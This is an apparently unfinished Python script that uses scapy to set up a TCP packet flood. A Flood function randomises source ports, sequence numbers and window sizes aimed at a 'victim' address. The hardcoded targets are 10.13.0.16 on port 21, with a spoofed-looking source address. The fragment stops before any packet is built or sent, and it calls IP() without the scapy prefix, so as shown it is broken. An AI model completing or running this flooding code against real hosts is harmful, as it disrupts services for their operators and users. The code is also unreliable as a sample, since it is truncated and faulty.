import scapy.all
import random
import os

def Flood(IP_victim, Port_victim, iterations):
	total=0
	print ("Sending Packets")
	
	for x in range(0,iterations):
		s_port=random.randint(1000,9000)
		s_eq=random.randint(1000,9000)
		w_windows=random.randint(1000,9000)

		IP_Packet=IP()

		

Victim="10.13.0.16"
Source="10.13.2.176"
Port=21

